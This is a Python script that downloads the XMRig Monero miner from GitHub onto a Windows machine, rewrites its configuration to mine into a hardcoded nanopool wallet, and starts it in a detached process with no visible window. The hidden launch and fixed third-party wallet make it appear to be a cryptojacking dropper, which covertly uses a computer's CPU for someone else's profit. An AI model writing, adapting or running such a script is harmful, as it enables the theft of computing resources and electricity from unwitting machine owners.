
import os
import platform
import requests
import shutil
import json
import subprocess
import time

def download_and_extract(url, destination_folder):
    try:
        print(f"Downloading from {url}")
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        response = requests.get(url, headers=headers, stream=True)

        if response.status_code == 200:
            zip_file_path = os.path.join(destination_folder, 'xmrig.zip')
            with open(zip_file_path, 'wb') as file:
                shutil.copyfileobj(response.raw, file)

            shutil.unpack_archive(zip_file_path, destination_folder)
            os.remove(zip_file_path)
            return True
        else:
            print(f"Failed to download from {url}")
            return False
    except Exception as e:
        print(f"Error: {e}")
        return False

def modify_config_file(config_file_path, new_content):
    try:
        with open(config_file_path, 'w') as file:
            file.write(new_content)

        print(f"Config file updated successfully.")
    except Exception as e:
        print(f"Error modifying config file: {e}")

def run_start_cmd(folder_path):
    try:
        start_cmd_path = os.path.join(folder_path, 'xmrig-6.21.0', 'start.cmd')
        subprocess.Popen([start_cmd_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
        print("start.cmd executed successfully.")
    except Exception as e:
        print(f"Error executing start.cmd: {e}")

def main():
    operating_system = platform.system().lower()

    if operating_system == 'windows':
        download_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip"
        desktop_folder = os.path.join(os.path.expanduser("~"), 'Desktop', 'xmrig')

        if not os.path.exists(desktop_folder):
            os.makedirs(desktop_folder)

        if download_and_extract(download_url, desktop_folder):
            config_file_path = os.path.join(desktop_folder, 'xmrig-6.21.0', 'config.json')

            # Define the new JSON content
            new_config_content = '''
            {
                "api": {
                    "id": null,
                    "worker-id": null
                },
                "http": {
                    "enabled": false,
                    "host": "127.0.0.1",
                    "port": 0,
                    "access-token": null,
                    "restricted": true
                },
                "autosave": true,
                "background": false,
                "colors": true,
                "title": true,
                "randomx": {
                    "init": -1,
                    "init-avx2": -1,
                    "mode": "auto",
                    "1gb-pages": false,
                    "rdmsr": true,
                    "wrmsr": true,
                    "cache_qos": false,
                    "numa": true,
                    "scratchpad_prefetch_mode": 1
                },
                "cpu": {
                    "enabled": true,
                    "huge-pages": true,
                    "huge-pages-jit": false,
                    "hw-aes": null,
                    "priority": null,
                    "memory-pool": false,
                    "yield": true,
                    "asm": true,
                    "argon2-impl": null,
                    "argon2": [0, 2, 3],
                    "cn": [
                        [1, 0],
                        [1, 2]
                    ],
                    "cn-heavy": [
                        [1, 0]
                    ],
                    "cn-lite": [
                        [1, 0],
                        [1, 2],
                        [1, 3]
                    ],
                    "cn-pico": [
                        [2, 0],
                        [2, 1],
                        [2, 2],
                        [2, 3]
                    ],
                    "cn/upx2": [
                        [2, 0],
                        [2, 1],
                        [2, 2],
                        [2, 3]
                    ],
                    "ghostrider": [
                        [8, 0],
                        [8, 2]
                    ],
                    "rx": [0, 2],
                    "rx/arq": [0, 1, 2, 3],
                    "rx/wow": [0, 2, 3],
                    "cn-lite/0": false,
                    "cn/0": false,
                    "rx/keva": "rx/wow"
                },
                "opencl": {
                    "enabled": false,
                    "cache": true,
                    "loader": null,
                    "platform": "AMD",
                    "adl": true
                },
                "cuda": {
                    "enabled": false,
                    "loader": null,
                    "nvml": true
                },
                "log-file": null,
                "donate-level": 1,
                "donate-over-proxy": 1,
                "pools": [
                    {
                        "algo": null,
                        "coin": "XMR",
                        "url": "xmr-asia1.nanopool.org:14433",
                        "user": "49RSMo4qcaSj91fiCNtcFQ1u3WsThZUdG6LdrudcMtAYe74NtruWnyFakX5Jw8PEYgjLqSd59mtcWYaX26TBUrky4EssW3Q",
                        "pass": null,
                        "rig-id": null,
                        "nicehash": false,
                        "keepalive": false,
                        "enabled": true,
                        "tls": true,
                        "sni": false,
                        "tls-fingerprint": null,
                        "daemon": false,
                        "socks5": null,
                        "self-select": null,
                        "submit-to-origin": false
                    }
                ],
                "retries": 5,
                "retry-pause": 5,
                "print-time": 60,
                "health-print-time": 60,
                "dmi": true,
                "syslog": false,
                "tls": {
                    "enabled": false,
                    "protocols": null,
                    "cert": null,
                    "cert_key": null,
                    "ciphers": null,
                    "ciphersuites": null,
                    "dhparam": null
                },
                "dns": {
                    "ipv6": false,
                    "ttl": 30
                },
                "user-agent": null,
                "verbose": 0,
                "watch": true,
                "pause-on-battery": false,
                "pause-on-active": false
            }
            '''
            
            modify_config_file(config_file_path, new_config_content)
            print("Tasks completed successfully.")

            # Run start.cmd in the background
            run_start_cmd(desktop_folder)
            
            # Give some time for xmrig to start before the script exits
            time.sleep(5)

        else:
            print("Operation aborted.")
    else:
        print("Unsupported operating system. Operation aborted.")

if __name__ == "__main__":
    main()
